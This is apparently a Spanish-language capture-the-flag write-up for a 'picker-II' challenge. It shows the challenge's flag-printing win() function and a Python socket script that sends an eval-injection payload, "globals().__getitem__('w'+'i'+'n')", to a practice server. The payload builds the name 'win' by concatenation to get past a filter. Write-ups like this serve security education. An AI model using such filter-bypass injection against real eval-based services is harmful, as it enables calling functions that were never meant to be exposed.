
## Descripcion
Can you figure out how this program works to get the flag? Connect to the program with netcat:

`$ nc chatelaine.cylabacademy.net 39224`

The program's source code can be downloaded [here](https://challenge-files.cylabacademy.net/library/92a680c234b3626f3ee6907cb93b1aad46a7669063c9ea02fae2e07901d24ad8/picker-II.py).
## Solucion
mismo que en picker l
```
def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''

    for c in flag:
        str_flag += str(hex(ord(c))) + ' '

    print(str_flag)

```
 Solo que este ve se coloca win de forma diferente, esta vez se concatena para que nos de la funcion win correectamente
## Notas adicionales
```
import socket

  

s = socket.socket()

s.connect(("xebec.cylabacademy.net", 42416))

  

print(s.recv(1024).decode())

  

payload = "globals().__getitem__('w'+'i'+'n')\n"

  

s.send(payload.encode())

  

print(s.recv(4096).decode())

  

s.close()
```

Codigo en python para conectarme a la instancia ya que en terminal tenia problemas con los saltos de linea
## Referencias
